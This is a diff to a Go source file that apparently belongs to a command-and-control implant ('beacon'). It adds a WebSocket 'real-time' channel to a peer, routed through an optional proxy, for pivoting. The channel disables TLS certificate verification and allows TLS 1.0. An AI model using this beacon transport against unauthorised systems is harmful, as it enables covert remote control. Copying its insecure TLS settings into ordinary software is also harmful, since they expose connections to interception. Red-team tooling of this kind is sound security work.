@@ -1,15 +1,21 @@
 package peers
 
 import (
+	"context"
 	"crypto/tls"
 	"fmt"
 	"io"
 	"net"
+	"net/http"
+	"net/url"
 	"strconv"
+	"time"
 
 	"orsted/beacon/transport/customhttp"
 	"orsted/beacon/utils"
 	"orsted/profiles"
+
+	"github.com/coder/websocket"
 )
 
 // HTTP or HTTPS peer
@@ -19,6 +25,7 @@ type HTTPSPeer struct {
 	Conf     profiles.ProfileConfig
 	Ip       string
 	Port     string
+	RealTimeConn net.Conn
 }
 
 // Http peer only require profile config
@@ -66,6 +73,58 @@ func (hp *HTTPSPeer) SetPeerID(s string) string {
 	hp.Id = s
 	return s
 }
+
+// Get Peer Address IP:PORT
+func (hp *HTTPSPeer) GetPeerAddress() string {
+	return hp.Ip + ":" + hp.Port
+}
+
+
+// Initialise WebSocket and return the underlying Conn
+// Need to handler error and multiple Websocket for pivot
+func (hp *HTTPSPeer) GetRealTimeConn(beaconId string) (net.Conn, error) {
+	//if hp.RealTimeConn != nil {
+	//	return hp.RealTimeConn, nil
+	//}
+	urlWs := "wss://" + hp.GetPeerAddress() + hp.Conf.Endpoints["autorouteMessage"] + beaconId
+	utils.Print("URL is --> ", urlWs)
+
+	ctx, _ := context.WithTimeout(context.Background(), time.Second*20)
+
+	var tlsConfig tls.Config
+	tlsConfig.InsecureSkipVerify = true
+	tlsConfig.ServerName = hp.Conf.Domain
+	tlsConfig.MinVersion = tls.VersionTLS10
+
+
+	var proxyUrl url.URL
+	var httpTransport *http.Transport
+	switch hp.Conf.HTTPProxyType {
+	case "https", "http":
+		proxyUrl = url.URL{
+			Scheme: hp.Conf.HTTPProxyType,
+			User:   url.UserPassword(hp.Conf.HTTPProxyUsername, hp.Conf.HTTPProxyPassword),
+			Host:   hp.Conf.HTTPProxyUrl,
+		}
+		httpTransport = &http.Transport{MaxIdleConns:    http.DefaultMaxIdleConnsPerHost, TLSClientConfig: &tlsConfig, Proxy: http.ProxyURL(&proxyUrl)}
+		utils.Print("Proxy Detected --> ", proxyUrl.String())
+		utils.Print("Proxy URL Before Websocket --> ", proxyUrl.String())
+	default:
+		httpTransport = &http.Transport{TLSClientConfig: &tlsConfig}
+	}
+
+	httpClient := &http.Client{Transport: httpTransport}
+	httpheader := &http.Header{}
+	wsConn, _, err := websocket.Dial(ctx, urlWs, &websocket.DialOptions{HTTPClient: httpClient, HTTPHeader: *httpheader})
+	if err != nil {
+		return nil, err
+	}
+	netctx, _ := context.WithTimeout(context.Background(), time.Hour*999999)
+	netConn := websocket.NetConn(netctx, wsConn, websocket.MessageBinary)
+	hp.RealTimeConn = netConn
+	return netConn, nil
+}
+
 
 // Send Data to Peer and get response
 func (hp *HTTPSPeer) SendRequest(dataToSend []byte) ([]byte, error) {
